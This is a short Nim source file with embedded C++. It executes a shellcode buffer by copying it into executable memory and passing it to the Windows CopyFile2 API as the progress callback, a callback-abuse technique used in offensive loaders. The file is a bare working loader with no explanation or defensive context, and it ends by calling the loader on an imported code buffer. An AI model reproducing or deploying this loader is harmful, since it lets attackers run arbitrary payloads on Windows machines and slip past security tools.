{.passC:"-D_WIN32_WINNT=0x601"} #https://github.com/msys2/MINGW-packages/pull/2553/commits/06dc93709704d5134d39141d678fc58508d558fe
import public

{.emit: """
#include <winbase.h>

int Copy2(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    COPYFILE2_EXTENDED_PARAMETERS params;

    params.dwSize = { sizeof(params) };
    params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
    params.pfCancel = FALSE;
    params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)addr;
    params.pvCallbackContext = nullptr;

    ::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
    ::CopyFile2(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", &params);
}
"""
.}

proc Copy2(plainBuffer:cstring,size:cint):cint {.importcpp:"Copy2(@)",nodecl.}

discard Copy2(code,codelen)